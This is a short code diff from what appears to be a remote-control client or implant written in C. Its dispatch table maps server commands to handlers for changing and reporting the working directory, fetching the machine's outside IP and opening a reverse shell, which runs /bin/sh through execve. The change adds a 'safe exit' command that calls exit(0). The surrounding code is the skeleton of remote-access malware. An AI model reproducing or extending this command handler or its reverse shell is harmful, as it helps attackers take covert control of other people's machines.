@@ -33,6 +33,7 @@ static int process_chdir(const void * in, int len, char * out, int maxSize);
 static int process_getcwd(const void * in, int len, char * out, int maxSize);
 static int process_getouterip(const void * in, int len, char * out, int maxSize);
 static int process_reverseshell(const void *in, int len, char * out, int maxSize);
+static int process_safeexit(const void *in, int len, char * out, int maxSize);
 
 static CMD_HANDLE g_cmdTable[256] = {
     0,
@@ -50,6 +51,7 @@ static CMD_HANDLE g_cmdTable[256] = {
     process_getcwd,//SERVER_CMD_GETCWD
     process_getouterip,//SERVER_CMD_GETOUTERIP
     process_reverseshell,
+    process_safeexit,
 };
 
 #define GET_CMD_HANDLE(code) g_cmdTable[code]
@@ -375,4 +377,10 @@ int process_reverseshell(const void *in, int len, char * out, int maxSize)
     char *const environ[] = {NULL};
     execve("/bin/sh", params, environ);
     return 0;
+}
+
+//安全退出
+int process_safeexit(const void *in, int len, char * out, int maxSize)
+{
+    exit(0);
 }
